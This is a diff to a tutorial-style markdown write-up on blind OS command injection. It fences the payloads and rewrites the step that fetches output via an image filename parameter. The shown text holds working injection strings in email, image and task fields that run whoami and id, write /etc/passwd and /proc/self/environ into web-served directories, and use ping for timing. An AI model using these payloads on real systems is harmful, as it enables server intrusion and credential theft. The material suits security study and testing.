@@ -654,9 +654,9 @@ This is a *real-world exploitation technique*, not lab-only behavior.
 ### Step 2 — Inject Time-Based Payload (Proof of Execution)
 
 Payload applied:
-
+```
 email=test@test.com||ping -c 10 127.0.0.1||
-
+```
 Result:
 
 - Application response delayed by ~10 seconds
@@ -667,9 +667,9 @@ Result:
 ### Step 3 — Redirect Command Output to File
 
 Payload used:
-
+```
 email=test@test.com||whoami>/var/www/images/output.txt||
-
+```
 What happens internally:
 
 - whoami executes on server
@@ -681,10 +681,10 @@ What happens internally:
 ### Step 4 — Fetch the Output File
 
 - Application loads images using a filename parameter
-- Attacker manually changes filename to:
-
-output.txt
-
+- Attacker manually changes filename in GET request of image file:
+```
+  GET /image?filename=output.txt HTTP/2
+```
 Result:
 
 - Browser displays OS command output
@@ -721,9 +721,9 @@ Application behavior:
 - Sends email or logs feedback using OS command
 
 Attack payload:
-
+```
 email=test@test.com; id > /var/www/html/id.txt
-
+```
 Impact:
 
 - OS command execution
@@ -739,9 +739,9 @@ Application behavior:
 - Resizes or converts images using system tools
 
 Attack:
-
+```
 image=test.jpg; whoami > /uploads/out.txt
-
+```
 Impact:
 
 - Remote command execution
@@ -760,9 +760,9 @@ Endpoints:
 ```
 
 Attack:
-
+```
 task=cleanup; cat /etc/passwd > /var/www/images/passwd.txt
-
+```
 Impact:
 
 - System file disclosure
@@ -789,9 +789,9 @@ Impact:
 ### Scenario 5 — Cloud / Container Environments
 
 Payloads:
-
+```
 whoami > /var/www/images/user.txt cat /proc/self/environ > /var/www/images/env.txt
-
+```
 Impact:
 
 - Cloud credential leakage
